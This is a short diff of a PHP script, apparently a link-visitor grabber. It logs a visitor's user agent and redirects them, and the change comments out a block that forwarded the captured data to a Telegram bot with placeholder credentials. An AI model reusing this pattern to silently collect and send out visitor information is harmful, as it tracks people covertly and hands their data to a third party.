@@ -19,13 +19,13 @@ fwrite($file, "[+] Useragent: " . $useragent);
 fclose($file);
 
 // send to your telegram bot :
-$apiToken = "#user agent";
-$data = [
-        'chat_id' => '#your id',
-        'text' => $useragent
-];
-$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
-http_build_query($data) );
+// $apiToken = "#user agent";
+// $data = [
+//        'chat_id' => '#your id',
+//        'text' => $useragent
+//];
+//$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
+//http_build_query($data) );
 
 // redirect to:
 header("Location: #redirect-info");
